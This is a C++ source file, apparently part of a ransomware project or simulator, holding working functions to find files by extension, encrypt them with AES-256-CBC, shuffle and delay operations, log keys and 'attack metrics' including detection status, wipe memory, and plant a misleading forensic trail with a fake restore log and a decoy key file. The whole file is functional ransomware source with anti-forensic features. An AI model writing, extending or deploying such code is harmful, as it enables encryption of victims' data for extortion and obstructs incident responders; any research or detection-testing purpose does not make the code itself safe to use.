#include "ransomware.h"

void generate_aes_key(unsigned char* key) {
    RAND_bytes(key, 32);
}

void generate_session_id(string& session_id) {
    unsigned char random_bytes[16];
    RAND_bytes(random_bytes, 16);
    session_id = bytes_to_hex(random_bytes, 16);
}

void aes_encrypt_file(const string& input_path, const string& output_path, const unsigned char* key) {
    ifstream infile(input_path, ios::binary);
    if (!infile.is_open()) {
        throw runtime_error("Cannot open input file");
    }
    
    vector<unsigned char> plaintext(
        (istreambuf_iterator<char>(infile)),
        istreambuf_iterator<char>()
    );
    infile.close();
    
    unsigned char iv[16];
    RAND_bytes(iv, sizeof(iv));
    
    EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
    EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv);
    
    vector<unsigned char> ciphertext(plaintext.size() + EVP_CIPHER_CTX_block_size(ctx));
    
    int out_len = 0, final_len = 0;
    EVP_EncryptUpdate(ctx, ciphertext.data(), &out_len, plaintext.data(), plaintext.size());
    EVP_EncryptFinal_ex(ctx, ciphertext.data() + out_len, &final_len);
    
    int total_len = out_len + final_len;
    ciphertext.resize(total_len);
    EVP_CIPHER_CTX_free(ctx);
    
    ofstream outfile(output_path, ios::binary);
    outfile.write(reinterpret_cast<char*>(iv), sizeof(iv));
    outfile.write(reinterpret_cast<char*>(ciphertext.data()), ciphertext.size());
    outfile.close();
}

vector<fs::path> find_target_files(const string& directory) {
    vector<fs::path> found_files;
    
    for (const auto& entry : fs::recursive_directory_iterator(directory)) {
        if (fs::is_regular_file(entry.path())) {
            string ext = entry.path().extension().string();
            for (char& c : ext) c = tolower(c);
            
            for (const auto& target : TARGET_EXTENSIONS) {
                if (ext == target) {
                    found_files.push_back(entry.path());
                    break;
                }
            }
        }
    }
    return found_files;
}

void randomize_file_order(vector<fs::path>& files) {
    random_device rd;
    mt19937 g(rd());
    shuffle(files.begin(), files.end(), g);
}

void log_to_c2(const unsigned char* key, const string& session_id, const string& process_id) {
    ofstream log("c2_server.log", ios::app);
    
    auto now = chrono::system_clock::now();
    auto time_t_now = chrono::system_clock::to_time_t(now);
    string timestamp = ctime(&time_t_now);
    timestamp.pop_back();
    
    log << "[" << timestamp << "] SESSION:" << session_id 
        << " PID:" << process_id 
        << " KEY:" << bytes_to_hex(key, 32) << endl;
    log.close();
}

void log_session_info(const SessionInfo& session) {
    ofstream log("session_history.log", ios::app);
    
    log << "Session: " << session.session_id << endl;
    log << "  Time: " << session.timestamp << endl;
    log << "  PID: " << session.process_id << endl;
    log << "  Key: " << bytes_to_hex(session.key, 32) << endl;
    log << "  Files: " << session.files_encrypted << endl;
    log << "  ---" << endl;
    log.close();
}

string bytes_to_hex(const unsigned char* bytes, size_t len) {
    stringstream ss;
    ss << hex << setfill('0');
    for (size_t i = 0; i < len; i++) {
        ss << setw(2) << static_cast<int>(bytes[i]);
    }
    return ss.str();
}

void secure_clear(unsigned char* data, size_t len) {
    volatile unsigned char* p = data;
    for (size_t i = 0; i < len; i++) {
        p[i] = 0;
    }
}

int get_process_id() {
    return getpid();
}

void forensic_wipe_memory(unsigned char* data, size_t len) {
    RAND_bytes(data, len);
    volatile unsigned char* p = data;
    for (size_t i = 0; i < len; i++) p[i] = 0;
    for (size_t i = 0; i < len; i++) p[i] = 0xFF;
    for (size_t i = 0; i < len; i++) p[i] = 0;
}

void random_delay() {
    random_device rd;
    mt19937 gen(rd());
    uniform_int_distribution<> dis(1, 100);
    this_thread::sleep_for(chrono::milliseconds(dis(gen)));
}

void log_attack_metrics(const AttackMetrics& metrics) {
    ofstream log("attack_metrics.log", ios::app);
    log << "=== ATTACK METRICS ===" << endl;
    log << "Total files found: " << metrics.total_files_found << endl;
    log << "Files encrypted: " << metrics.files_encrypted << endl;
    log << "Files detected before: " << metrics.files_detected_before << endl;
    log << "Detection occurred: " << (metrics.was_detected ? "YES" : "NO") << endl;
    log << "Detection time: " << metrics.detection_time << endl;
    log << "Execution time: " << metrics.execution_time_seconds << " seconds" << endl;
    log << "===================" << endl << endl;
    log.close();
}

void create_forensic_misleading_trail() {
    ofstream fake_log("system_restore.log", ios::app);
    fake_log << "[FAKE] System restore point created at: " << time(nullptr) << endl;
    fake_log.close();
    
    ofstream fake_key("temp_key_backup.key", ios::binary);
    unsigned char fake_key_data[32];
    RAND_bytes(fake_key_data, 32);
    fake_key.write(reinterpret_cast<char*>(fake_key_data), 32);
    fake_key.close();
    
    thread([](){
        this_thread::sleep_for(chrono::seconds(5));
        remove("temp_key_backup.key");
    }).detach();
}